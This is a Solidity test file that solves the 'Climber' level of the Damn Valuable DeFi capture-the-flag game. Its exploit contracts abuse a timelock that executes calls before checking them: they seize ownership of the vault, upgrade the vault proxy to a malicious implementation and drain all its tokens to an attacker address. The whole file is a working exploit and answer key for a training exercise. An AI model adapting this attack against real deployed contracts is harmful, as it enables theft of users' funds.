// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

contract ClimberVaultExploit is ClimberVault {
    constructor() initializer {}

    function exploit(address _tokenAddress, address _attacker) external {
        DamnValuableToken token = DamnValuableToken(_tokenAddress);
        require(token.transfer(_attacker, token.balanceOf(address(this))), "Transfer failed");
    }
}

contract ClimberTimelockExploit {
    function schedule(address _attacker, address _vault, address _timelock, bytes32 _salt) external {
        ClimberTimelock vaultTimeLock = ClimberTimelock(payable(_timelock));
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint[](3);
        bytes[] memory datas = new bytes[](3);
        // set attacker as owner
        targets[0] = address(_vault);
        values[0] = 0;
        datas[0] = abi.encodeWithSignature("transferOwnership(address)", _attacker);
        // set this contract as proposer
        targets[1] = address(_timelock);
        values[1] = 0;
        datas[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimeLock.PROPOSER_ROLE(), address(this));
        // create the proposal
        targets[2] = address(this);
        values[2] = 0;
        datas[2] =
            abi.encodeWithSignature("schedule(address,address,address,bytes32)", _attacker, _vault, _timelock, _salt);
        vaultTimeLock.schedule(targets, values, datas, _salt);
    }
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        ClimberTimelockExploit climberTimelockExploit = new ClimberTimelockExploit();

        bytes32 salt = keccak256(abi.encodePacked("salt"));
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint[](3);
        bytes[] memory datas = new bytes[](3);

        // set attacker as owner
        targets[0] = address(climberVaultProxy);
        values[0] = 0;
        datas[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
        // set this contract as proposer
        targets[1] = address(climberTimelock);
        values[1] = 0;
        datas[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(climberTimelockExploit)
        );
        // create the proposal
        targets[2] = address(climberTimelockExploit);
        values[2] = 0;
        datas[2] = abi.encodeWithSignature(
            "schedule(address,address,address,bytes32)",
            attacker,
            address(climberVaultProxy),
            address(climberTimelock),
            salt
        );

        vm.startPrank(attacker);

        climberTimelock.execute(targets, values, datas, salt);

        ClimberVaultExploit climberVaultExploit = new ClimberVaultExploit();

        ClimberVault(address(climberVaultProxy)).upgradeTo(address(climberVaultExploit));
        ClimberVaultExploit(address(climberVaultProxy)).exploit(address(dvt), attacker);
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
